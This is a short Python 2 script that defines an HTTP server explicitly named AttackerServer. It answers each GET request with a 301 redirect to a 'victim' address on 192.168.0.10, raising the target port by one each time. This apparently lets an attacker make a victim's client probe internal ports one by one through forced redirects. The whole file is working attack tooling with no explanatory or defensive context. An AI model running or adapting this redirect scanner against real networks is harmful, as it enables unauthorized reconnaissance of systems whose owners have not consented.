#!/usr/bin/env python

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

class AttackerServer(BaseHTTPRequestHandler):
 '''Responds to HTTP GET requests and sends redirect 301'''

#Declare starting port number
 global network_port
 network_port = 0


 def do_GET(self):
        '''Handler for GET requests, send 301 redirect'''

        global network_port

        #Increment target network port on each GET request
        network_port += 1

        #Send 301 redirect header to victim local host address
        self.send_response(301)
        self.send_header('Location', 'http://192.168.0.10:'+ str(network_port))
        self.end_headers()

        return


def start_server():
    '''Function to start basic HTTP server on TCP port 80'''

    ip_address = ('192.168.0.6', 80)
    httpd_server = HTTPServer(ip_address, AttackerServer)
    print 'HTTP server running on port 80...'
    httpd_server.serve_forever()


if __name__ == '__main__':
    start_server()
